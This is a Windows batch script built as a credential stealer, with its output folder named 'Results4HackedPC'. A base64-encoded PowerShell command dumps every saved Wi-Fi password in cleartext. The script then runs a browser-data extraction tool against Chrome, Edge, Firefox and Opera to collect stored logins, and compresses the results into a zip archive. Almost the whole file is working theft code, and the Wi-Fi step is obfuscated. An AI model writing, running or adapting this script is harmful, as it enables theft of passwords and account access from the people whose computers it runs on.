@echo off
:: variables
echo SET odrive=%odrive:~0,2%
echo set varname = odrive
set backupcmd=xcopy /s /c /d /e /h /i /r /y
echo off
cd %USERPROFILE%
mkdir Results4HackedPC
cd Results4HackedPC
mkdir WifiPasswords
cd WifiPasswords
powershell -EncodedCommand "KABuAGUAdABzAGgAIAB3AGwAYQBuACAAcwBoAG8AdwAgAHAAcgBvAGYAaQBsAGUAcwApACAAfAAgAFMAZQBsAGUAYwB0AC0AUwB0AHIAaQBuAGcAIAAcIFwAOgAoAC4AKwApACQAHSAgAHwAIAAlAHsAJABuAGEAbQBlAD0AJABfAC4ATQBhAHQAYwBoAGUAcwAuAEcAcgBvAHUAcABzAFsAMQBdAC4AVgBhAGwAdQBlAC4AVAByAGkAbQAoACkAOwAgACQAXwB9ACAAfAAgACUAewAoAG4AZQB0AHMAaAAgAHcAbABhAG4AIABzAGgAbwB3ACAAcAByAG8AZgBpAGwAZQAgAG4AYQBtAGUAPQAdICQAbgBhAG0AZQAdICAAawBlAHkAPQBjAGwAZQBhAHIAKQB9ACAAfAAgAFMAZQBsAGUAYwB0AC0AUwB0AHIAaQBuAGcAIAAcIEsAZQB5ACAAQwBvAG4AdABlAG4AdABcAFcAKwBcADoAKAAuACsAKQAkAB0gIAB8ACAAJQB7ACQAcABhAHMAcwA9ACQAXwAuAE0AYQB0AGMAaABlAHMALgBHAHIAbwB1AHAAcwBbADEAXQAuAFYAYQBsAHUAZQAuAFQAcgBpAG0AKAApADsAIAAkAF8AfQAgAHwAIAAlAHsAWwBQAFMAQwB1AHMAdABvAG0ATwBiAGoAZQBjAHQAXQBAAHsAIABQAFIATwBGAEkATABFAF8ATgBBAE0ARQA9ACQAbgBhAG0AZQA7AFAAQQBTAFMAVwBPAFIARAA9ACQAcABhAHMAcwAgAH0AfQAgAHwAIABGAG8AcgBtAGEAdAAtAFQAYQBiAGwAZQAgAC0AQQB1AHQAbwBTAGkAegBlACAAfAAgAE8AdQB0AC0ARgBpAGwAZQAgAFcAaQBmAGkAUABhAHMAcwB3AG8AcgBkAC4AdAB4AHQA"

cd..

mkdir Hacked-Browsers-Credintionals
cd Hacked-Browsers-Credintionals
%~dp0hackbrowserdata.exe -b chrome -f json --results-dir Chrome
%~dp0hackbrowserdata.exe -b edge -f json --results-dir Microsoft-Edge
%~dp0hackbrowserdata.exe -b firefox -f json --results-dir FireFox"
%~dp0hackbrowserdata.exe -b opera -f json --results-dir Opera"
cd ..
cd %USERPROFILE%
powershell -c Compress-Archive "Results4HackedPC" "Results4HackedPC.zip"
@echo off
pause